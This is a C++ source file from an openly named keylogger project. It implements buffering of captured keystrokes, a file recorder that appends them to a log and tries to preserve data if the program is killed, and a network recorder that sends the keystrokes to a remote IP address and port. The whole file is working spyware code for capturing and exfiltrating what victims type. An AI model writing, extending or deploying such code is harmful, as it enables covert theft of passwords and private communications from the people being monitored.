#include "recorder/recorder.h"

#include <cerrno>
#include <cstring>
#include <fstream>
#include <iostream>
#include <stdexcept>
#include <string>

namespace keylogger {

Recorder::Recorder(int key_limit) : num_keys_(0) {
  if (key_limit <= 0) {
    throw std::invalid_argument("key_limit must be a positive integer");
  }
  keys_.resize(key_limit);
}

void Recorder::BufferKeyPress(char character) {
  if (num_keys_ >= static_cast<int>(keys_.capacity())) {
    /* No room remaining to log this key, flush the buffer. */
    Transmit();
  }
  keys_[num_keys_++] = character;
}

FileRecorder::FileRecorder(int key_limit, const std::filesystem::path& log_path)
    : Recorder(key_limit), log_path_(log_path) {}

void FileRecorder::Transmit() {
  if (!num_keys_) {
    return;
  }

  /* We open and close the log file everytime Transmit() is called because we
   * want to ensure in the case the program is stopped abruptly, we will have a
   * chance at saving some keystroke data. */
  std::ofstream log_handle(log_path_.c_str(), std::ios_base::app);
  if (!log_handle) {
    throw std::runtime_error("unable to open key log file");
  }
  log_handle.write(keys_.data(), num_keys_);
  num_keys_ = 0;
}

NetworkRecorder::NetworkRecorder(int key_limit, const std::string& ip, int port)
    : Recorder(key_limit), tx_socket_(ip, port) {}

void NetworkRecorder::Transmit() {
  if (!num_keys_) {
    return;
  }

  int bytes_sent = tx_socket_.Send(keys_.data(), num_keys_);
  if (bytes_sent != num_keys_) {
    std::cerr << "warning: only" << bytes_sent << "/" << num_keys_
              << "bytes sent" << std::endl;
  }
  num_keys_ = 0;
}

}  // namespace keylogger
